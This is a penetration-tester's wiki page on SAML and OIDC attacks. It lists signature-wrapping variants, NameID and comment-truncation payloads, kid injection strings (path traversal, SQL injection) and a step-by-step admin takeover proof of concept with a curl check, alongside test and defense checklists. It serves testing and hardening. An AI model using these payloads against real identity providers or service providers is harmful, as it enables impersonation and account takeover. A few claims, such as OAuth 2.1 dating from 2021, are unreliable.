---
type: wiki
category: attack
tool: samlraider,burp,manual
status: active
last-updated: 2026-04-21
---

# SAML / OIDC Attacks Deep Dive (2026 Edition)

> **Purpose:** SAML is the dominant enterprise SSO standard, and its implementation complexity means lots of bugs. XML Signature Wrapping / assertion validation flaws are RCE-equivalent. OIDC is newer, but lax ID token validation is also commonly broken. **Mandatory check for enterprise targets.**

## 0. SAML Basics

```
User → SP (Service Provider) → IdP (Identity Provider) → assertion → SP → granted
```

- SAMLRequest (SP → IdP) — Base64 + deflate
- SAMLResponse (IdP → SP) — Base64 XML + signature
- Key check: does the SP verify signature + audience + notOnOrAfter

## 1. SAML Attacks

### 1.1 XML Signature Wrapping (XSW)

**Core idea:** the XML fragment covered by `<Signature>` is not necessarily the same fragment the SP reads attributes from.

8 XSW variants (all supported by Burp SAML Raider):

```
XSW1: Wrap the old Assertion at the Response root, place a new Assertion underneath it
XSW2: Place a new Assertion before the Response
XSW3: Duplicate the Assertion — the original is signed, the new one sits at the Response root
XSW4: Place a new Assertion as a child of the Response, wrapping the original signed Assertion
XSW5: Embed a copy inside the Assertion
XSW6: Wrap inside the Assertion's own Signature
XSW7: Wrap using an Extensions element
XSW8: Place the wrapping under an Object element
```

### 1.2 Signature stripping

```
# If the SP doesn't enforce that a signature is present
# → simply remove the <Signature> element
# → the SP still accepts it → any attribute can be modified
```

### 1.3 Signature algorithm confusion

```
# IdP uses RS256, but the SP allows HMAC
# → attacker uses the SP's public key as the HMAC secret
# → produces a valid HMAC signature
```

Analogous to JWT alg=none / alg confusion.

### 1.4 XXE in SAML

SAML is XML, so all XXE techniques apply. See [75-xxe-deep.md](75-xxe-deep.md).

### 1.5 Missing audience check

```
# Steal an assertion issued for a different SP → replay it against the target SP
# If the target SP doesn't validate <Audience> → it gets accepted
```

### 1.6 NameID injection

```xml
<!-- Legitimate -->
<NameID>victim@target.com</NameID>

<!-- Attack -->
<NameID>victim@target.com<!-- --></NameID>
<!-- or -->
<NameID>victim@target.com%00admin@target.com</NameID>
```

### 1.7 Comment truncation attack

```xml
<!-- 2018 Duo Security bypass -->
<NameID>victim@evil.com<!---->admin@target.com</NameID>
<!-- Some parsers read: "victim@evil.com" -->
<!-- Other parsers read: "admin@target.com" -->
```

### 1.8 Replay attack

```
# Without OneTimeUse / without tracking already-used assertions → an assertion can be reused
```

### 1.9 SAMLRequest injection

```
# Modify the AssertionConsumerServiceURL in the AuthnRequest
# → the IdP sends the assertion to the attacker
# (if the IdP doesn't pin the ACS URL)
```

### 1.10 IdP metadata injection

```
# If the SP accepts user-supplied IdP metadata → a fake IdP can be substituted
```

## 2. OIDC Attacks

### 2.1 ID token alg=none

```json
{ "alg": "none" }
```

See [31-jwt-attack-walkthrough.md](31-jwt-attack-walkthrough.md).

### 2.2 alg confusion (RS256 → HS256)

Use the public key as the HMAC secret.

### 2.3 kid injection

```
# JWT header "kid": "../../../../dev/null"
# or "kid": "1 UNION SELECT ..." (SQLi)
```

### 2.4 redirect_uri bypass

See [16-oauth-attack-chains.md](16-oauth-attack-chains.md).

### 2.5 Missing state / nonce

```
# No state → login CSRF
# No nonce → ID token replay
```

### 2.6 Trusting jwks_uri

```
# Unverified discovery doc
# If the SP fetches https://idp.example/.well-known/openid-configuration
# and trusts jwks_uri → if SSRF can redirect the fetch source → attacker controls the jwks
```

### 2.7 JWKS key confusion

```
# The response contains multiple kid entries
# An attacker-specified kid's key material may end up being accepted
```

### 2.8 Authorization code reuse

```
# A code should be single-use and bound to client_id + redirect_uri
# If it isn't bound → a stolen code can be exchanged for a token
```

### 2.9 PKCE downgrade

```
# An attacker strips the PKCE parameters
# If the SP doesn't enforce PKCE → it falls back to the vulnerable flow
```

### 2.10 Client_secret exposed on the frontend

```
# Real-world case: an SPA hardcoded client_secret in its JS
```

### 2.11 Public client + implicit flow

```
# Implicit flow is deprecated (removed in OAuth 2.1, 2021)
# If it's still enabled → the token ends up directly in the URL fragment → XSS / referrer leak risk
```

## 3. Tools

### 3.1 SAML Raider (Burp extension)

```
# Burp → BApp Store → SAML Raider
# Intercept SAMLResponse → right-click → SAML Raider → try all 8 XSW variants
```

### 3.2 SSO Wall of Shame

https://sso.tax/ — lists SaaS vendors that charge extra for SSO (unrelated to vulnerabilities, but useful background)

### 3.3 samldump / python3-saml

```bash
pip install python3-saml
# manual XML manipulation
```

### 3.4 OAuth / OIDC tools

```bash
# oidc-inspector
# jwt_tool
pip install jwt_tool
python3 jwt_tool.py -M at <target_url>
```

## 4. Practical Workflow

### 4.1 Find SAML endpoints

```
/saml/acs                (Assertion Consumer Service)
/saml/login
/sso/saml
/_saml/acs
/auth/saml/callback
.well-known/saml-metadata
```

### 4.2 Capture the SAMLResponse

```
# Intercept the POST to /saml/acs in Burp
# Body: SAMLResponse=<base64 encoded XML>
# Decode → inspect the assertion structure
```

### 4.3 Test checklist

```
[ ] XSW1-8 (via SAML Raider)
[ ] Strip signature
[ ] Modify NameID
[ ] Comment truncation
[ ] Replay an old assertion
[ ] Change Audience to the attacker's SP
[ ] XXE inside the assertion
[ ] Whether NotOnOrAfter expiry is checked
[ ] Modify AttributeStatement (role=admin)
```

### 4.4 OIDC checklist

```
[ ] state / nonce enforced
[ ] redirect_uri exact match
[ ] code is single-use + bound
[ ] PKCE enforced (for public clients)
[ ] ID token alg pinned
[ ] kid handled safely
[ ] JWKS not fetched from an arbitrary external source
[ ] aud / iss / exp validated
```

## 5. Full PoC: SAML XSW → admin takeover

### Step 1: Normal flow

```
1. Log in with the attacker's own account
2. Intercept SAMLResponse in Burp
3. Decode base64
4. Observe <NameID>attacker@test.com</NameID>
5. Observe <AttributeValue>role=user</AttributeValue>
```

### Step 2: Try XSW3 with SAML Raider

```
1. Right-click the response → SAML Raider → XSW Attacks → XSW3
2. Change NameID to admin@target.com
3. Change role to admin
4. Forward
```

### Step 3: Observe the result

```
If the SP accepts it → logged in as admin
Response 302 to /admin/dashboard
```

### Step 4: Verify

```bash
curl https://target.com/admin/api/users \
  -b "session=$NEW_COOKIE"
# → lists all users
```

### Step 5: Report

```markdown
## Vulnerability Summary
The SAML validator used at https://target.com/saml/acs has an XML Signature
Wrapping (XSW) vulnerability (variant XSW3). An attacker can duplicate and
modify the Assertion so that the original signature remains valid while the
SP reads the tampered NameID and AttributeStatement, enabling impersonation
of any user (including admin) and full account takeover.

## PoC
[Original SAMLResponse + XSW3-modified XML + forward result + /admin access]

## Impact
- Impersonation of any user (requires knowing the target's NameID, typically email / username)
- Full system admin takeover
- Bypasses all SAML-based access control

## Severity
P1 / Critical

## Remediation
1. Upgrade the SAML library to a 2018+ release (most have fixed XSW)
2. Use strict XML canonicalization during validation
3. Disable SAML comments (or strip comments via c14n)
4. After verifying the signature, use ID-based lookup instead of XPath
5. Consider migrating to OIDC (newer spec, smaller attack surface)
```

## 6. Defense Checklist

```
SAML:
1. Use a well-maintained library (latest Shibboleth, SimpleSAMLphp, passport-saml)
2. After verifying the signature, fetch data via reference-by-ID, not XPath
3. Strictly validate <Audience>
4. Enforce <NotOnOrAfter>
5. OneTimeUse or a server-side seen-ID set
6. Disable DOCTYPE (XXE)
7. Test XSW 1-8 (Raider)

OIDC:
1. Enforce state + nonce
2. Enforce PKCE (for all clients)
3. redirect_uri exact match
4. ID token alg lock + kid whitelist
5. Cache jwks_uri, don't fetch blindly
6. code is single-use + bound to client
7. Don't use implicit flow
```

## Related Documents

- [16-oauth-attack-chains.md](16-oauth-attack-chains.md) — OAuth redirect_uri bypass
- [31-jwt-attack-walkthrough.md](31-jwt-attack-walkthrough.md) — JWT alg confusion
- [75-xxe-deep.md](75-xxe-deep.md) — XXE within SAML
- SAML Raider: https://github.com/CompassSecurity/SAMLRaider
- PortSwigger SAML: https://portswigger.net/web-security/saml
- SSO Wall of Shame: https://sso.tax/
- Duo XSW research: https://duo.com/labs/research/duo-finds-saml-vulnerabilities-affecting-multiple-implementations
